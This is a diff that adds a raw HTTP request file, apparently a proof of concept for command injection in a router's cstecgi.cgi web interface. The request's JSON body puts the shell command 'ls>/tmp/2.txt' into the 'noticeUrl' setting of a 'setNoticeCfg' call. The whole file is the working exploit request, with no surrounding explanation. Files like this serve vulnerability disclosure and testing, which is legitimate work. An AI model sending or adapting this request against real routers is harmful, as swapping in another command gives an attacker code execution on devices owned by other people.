@@ -1,0 +1,19 @@
+POST /cgi-bin/cstecgi.cgi HTTP/1.1
+Host: 192.168.0.1
+Content-Length: 52
+Accept: application/json, text/javascript, */*; q=0.01
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Origin: http://192.168.0.1
+Referer: http://192.168.0.1/advance/remote.html?time=1659768805889
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: uid=XNv1ntlL5i; SESSION_ID=2:1592019966:2
+Connection: close
+
+{
+"addEffect":"0",
+"noticeUrl":"ls>/tmp/2.txt",
+"noticeTimeoutVal":"120",
+"port":1024,"enable":"1","topicurl":"setNoticeCfg"}
